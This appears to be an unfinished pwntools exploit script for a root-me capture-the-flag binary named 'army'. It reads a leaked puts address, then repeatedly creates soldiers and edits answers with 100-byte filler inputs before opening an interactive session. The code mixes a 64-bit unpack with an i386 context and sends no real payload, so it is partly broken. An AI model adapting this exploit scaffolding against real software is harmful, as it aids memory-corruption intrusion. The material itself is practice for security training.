#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

from pwn import *

context(arch="i386", os="linux", endian="little")
context.log_level="DEBUG"


class Pwn:
    def __init__(self):
        self.p = None
        self.e = ELF("./army")

    def start_binary(self):
        self.p = process("./army")
#        self.p = remote("challenge03.root-me.org", 56526)
        self.p.recvuntil(" : ")

    def create_soldier(self, name, height, weight, answer_length, description):
        self.p.sendline("1")
        self.p.recvuntil("name: ")
        self.p.sendline(name)
        self.p.recvuntil("height: ")
        self.p.sendline(str(height))
        self.p.recvuntil("weight: ")
        self.p.sendline(str(weight))
        self.p.recvuntil("answer: ")
        self.p.sendline(str(answer_length))
        self.p.recvuntil("description: ")
        self.p.sendline(str(description))
        self.p.recvuntil("promotion\n")

    def print_soldier(self):
        self.p.sendline("2")
        self.p.recvuntil("promotion\n")

    def edit_answer(self, answer):
        self.p.sendline("3")
        self.p.recvuntil("answer : ")
        self.p.sendline(answer)
        self.p.recvuntil("promotion\n")

    def pwn_binary(self):
        self.start_binary()
        pause()

        leak_puts=u64(self.p.recvline()[:-1]+"\x00"*2)
        print "[*] Leak puts address: "+hex(leak_puts)
        self.p.recvuntil("promotion\n")

        for i in xrange(0, 100000):
            self.create_soldier("TOTO", 42, 42, 111, "A"*100)
            self.edit_answer("B"*100)

        self.p.interactive()
        self.p.close()


def main():
    pwn = Pwn()
    pwn.pwn_binary()


if __name__ == "__main__":
    main()
